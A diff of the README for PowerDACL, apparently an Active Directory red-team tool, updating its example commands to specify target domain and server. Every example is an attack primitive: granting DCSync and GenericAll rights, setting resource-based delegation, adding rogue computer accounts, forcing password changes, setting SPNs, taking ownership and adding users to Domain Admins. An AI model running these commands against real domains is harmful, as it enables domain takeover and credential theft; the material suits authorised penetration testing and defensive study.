@@ -14,109 +14,91 @@ PowerDACL
 
 ## Grant DCSync rights
 ```
-DCSync -Target username
-```
-```
-DCSync -Target username -TargetDomain userdomain
+DCSync -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
 ```
 
 ## Grant GenericAll rights
 ```
-GenericAll -Target MSSQL01$ -Grantee username
+GenericAll -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username
 ```
 ```
-GenericAll -Target MSSQL01$ -TargetDomain acme.local -Grantee username -GranteeDomain domain.local
+GenericAll -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username -GranteeDomain domain.local -GranteeServer dc02.domain.local
 ```
 
 ## Set RBCD:
 ```
-RBCD -Target MSSQL01$ -Grantee username
+RBCD -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username
 ```
 ```
-RBCD -Target MSSQL01$ -TargetDomain domain.local -Grantee username -GranteeDomain acme.local
+RBCD -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username -GranteeDomain domain.local -GranteeServer dc02.domain.local
 ```
 ```
-RBCD -Target MSSQL01$ -Clear
+RBCD -Clear -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
 ```
 
 ## Add Computer to domain
 ```
-AddComputer -ComputerName evilcomputer -Password P@ssw0rd!
+AddComputer -ComputerName evilcomputer -Password P@ssw0rd! -Domain ferrari.local -Server dc01.ferrari.local
 ```
 ```
-AddComputer -ComputerName evilcomputer -Password P@ssw0rd! -Domain ferrari.local
+AddComputer -ComputerName evilcomputer -Domain ferrari.local -Server dc01.ferrari.local
 ```
 
 ## Delete Computer from domain
 ```
-DeleteComputer -ComputerName evilcomputer
-```
-```
-DeleteComputer -ComputerName evilcomputer -Domain ferrari.local
+DeleteComputer -ComputerName evilcomputer -Domain ferrari.local -Server dc01.ferrari.local
 ```
 
 ## Force Change Password
 ```
-ForceChangePass -Target username -Password P@ssw0rd!
-```
-```
-ForceChangePass -Target username -Password P@ssw0rd! -TargetDomain usserdomain
+ForceChangePass -Target username -Password P@ssw0rd! -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
 ```
 
 ## Set SPN:
 ```
-SetSPN -Target username
+SetSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
 ```
 ```
-SetSPN -Target username -TargetDomain userdomain -SPN "test/test"
+SetSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -SPN "test/test"
 ```
 
 ## Remove SPN:
 ```
-RemoveSPN -Target username
-```
-```
-RemoveSPN -Target username -TargetDomain userdomain
+RemoveSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
 ```
 
 ## Set Owner
 ```
-SetOwner -Target MSSQL01$ -Owner username
+SetOwner -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Owner username
 ```
 ```
-SetOwner -Target MSSQL01$ -TargetDomain acme.local -Owner username -OwnerDomain domain.local
+SetOwner -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Owner username -OwnerDomain domain.local -OwnerServer dc02.domain.local
 ```
 
 ## Enable Account
 ```
-EnableAccount -Target myComputer$
-```
-```
-EnableAccount -Target myComputer$ -Domain userdomain
+EnableAccount -Target myComputer$ -Domain ferrari.local -Server dc01.ferrari.local
 ```
 
 ## Disable Account
 ```
-DisableAccount -Target myComputer$
-```
-```
-DisableAccount -Target myComputer$ -Domain userdomain
+DisableAccount -Target myComputer$ -Domain ferrari.local -Server dc01.ferrari.local
 ```
 
 ## Add object to a group
 ```
-AddToGroup -Target user -Group "Domain Admins"
+AddToGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group "Domain Admins"
 ```
 ```
-AddToGroup -Target user -Group "Domain Admins" -Domain userdomain
+ AddToGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group "Domain Admins" -GroupDomain domain.local -GroupServer dc02.domain.local
 ```
 
 ## Remove object from a group
 ```
-RemoveFromGroup -Target user -Group "Domain Admins"
+RemoveFromGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group "Domain Admins"
 ```
 ```
-RemoveFromGroup -Target user -Group "Domain Admins" -Domain userdomain
+RemoveFromGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group "Domain Admins" -GroupDomain domain.local -GroupServer dc02.domain.local
 ```
 
 ## Modify or clear a property for an object
